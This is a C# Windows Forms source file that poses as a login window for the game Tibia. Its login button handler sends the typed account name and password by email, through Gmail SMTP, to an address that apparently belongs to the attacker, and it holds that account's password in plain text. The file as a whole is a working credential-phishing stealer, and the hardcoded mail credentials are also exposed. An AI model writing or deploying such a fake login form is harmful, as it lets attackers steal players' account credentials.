using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TibiaLoginMenu
{
    public partial class Tibia : Form
    {
        public Tibia()
        {
            InitializeComponent();
        }

        private void btnLogin_Click(object sender, EventArgs e)
        {
            // Obiekt klasy MailMessage odzwierciedla wiadomość email za pomocą której wyślemy pozyskane dane
            MailMessage mail = new MailMessage("gigancihacking@gmail.com", "gigancihacking@gmail.com");

            // Wypełnienie zawartości wiadomości
            mail.Subject = "Tibia login data";
            mail.Body = $"Login: {txtAccount.Text} | Password: {txtPassword.Text}";

            // Tworzyky klienta SMTP który umożliwia wysłanie maila do serwera Google a ten wyśle go do odbiorcy
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.UseDefaultCredentials = false;
            client.Credentials = new NetworkCredential("gigancihacking@gmail.com", "giganci1234");

            client.EnableSsl = true;

            client.Send(mail);
        }
    }
}